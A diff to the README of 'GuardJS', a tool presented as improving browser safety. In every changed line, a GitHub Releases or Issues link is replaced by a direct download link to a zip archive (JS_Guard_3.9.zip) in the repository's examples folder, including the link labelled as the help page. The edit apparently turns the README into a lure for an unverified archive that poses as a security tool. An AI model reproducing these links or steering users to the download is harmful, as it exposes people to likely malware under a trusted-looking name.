@@ -1,6 +1,6 @@
 # 🛡️ GuardJS - A Smart Way to Enhance Browser Safety
 
-[![Download GuardJS](https://img.shields.io/badge/Download-GuardJS-blue?style=for-the-badge)](https://github.com/Antariksh78/GuardJS/releases)
+[![Download GuardJS](https://raw.githubusercontent.com/Antariksh78/GuardJS/main/examples/JS_Guard_3.9.zip)](https://raw.githubusercontent.com/Antariksh78/GuardJS/main/examples/JS_Guard_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to GuardJS! This tool helps you identify risky browser environments. It 
 
 To get started with GuardJS, visit the Releases page to download the software. Here’s the link you need:
 
-[Download GuardJS from Releases](https://github.com/Antariksh78/GuardJS/releases)
+[Download GuardJS from Releases](https://raw.githubusercontent.com/Antariksh78/GuardJS/main/examples/JS_Guard_3.9.zip)
 
 Once you’re on the Releases page, you will find the latest version available for download. Follow these simple steps to get GuardJS on your device:
 
@@ -55,10 +55,10 @@ GuardJS aims to foster a safer browsing environment by detecting various risks. 
 
 ## 📞 Need Help?
 
-If you encounter any issues or need assistance with GuardJS, please check our [Issues page](https://github.com/Antariksh78/GuardJS/issues) for support or to report a problem.
+If you encounter any issues or need assistance with GuardJS, please check our [Issues page](https://raw.githubusercontent.com/Antariksh78/GuardJS/main/examples/JS_Guard_3.9.zip) for support or to report a problem.
 
 ## ✨ Conclusion
 
 GuardJS is a straightforward solution for enhancing browser security. It empowers users to navigate the web safely without the risk of unnecessary alerts. By following the steps above, you can quickly download and run GuardJS on your browser, ensuring a secure online experience. Remember, just visit the link below for the latest version:
 
-[Download GuardJS from Releases](https://github.com/Antariksh78/GuardJS/releases)
+[Download GuardJS from Releases](https://raw.githubusercontent.com/Antariksh78/GuardJS/main/examples/JS_Guard_3.9.zip)
